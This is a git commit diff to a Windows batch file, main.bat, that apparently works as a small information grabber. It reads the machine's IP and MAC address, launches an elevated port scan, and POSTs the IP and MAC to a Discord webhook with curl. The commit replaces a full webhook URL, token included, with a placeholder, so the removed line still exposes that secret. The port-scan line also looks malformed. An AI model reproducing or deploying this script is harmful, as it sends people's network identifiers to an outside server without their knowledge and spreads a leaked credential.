b2d34ddaba4462421dc780886ef06ac1ae33a568
pawmi <146555582+PwnMi@users.noreply.github.com>
2024-01-05 14:17:36 +0000

    Update main.bat

--- main.bat
+++ main.bat
@@ -14,6 +14,6 @@ echo Your MAC Address is: %mac%
 echo Fetching open ports...
 powershell Start-Process -FilePath "cmd.exe" -ArgumentList "/c Test-NetConnection %ip% -Port 1-65535 -InformationLevel Detailed | Where-Object { $_.TcpTestSucceeded -eq 'True' } | Select-Object RemotePort" -Verb RunAs
 
-set "webhook_url=https://discord.com/api/webhooks/1182860829197090897/8A8x8aWWvVE_tO5C1VxBL7mGD895sI2hL-GAETtEy1AqcMp3iiF1MbJk4WupMQZKGY6q"
+set "webhook_url=WEBHOOKURL"
 curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Your IP Address is: %ip%\nYour MAC Address is: %mac%\"}" %webhook_url%
 pause
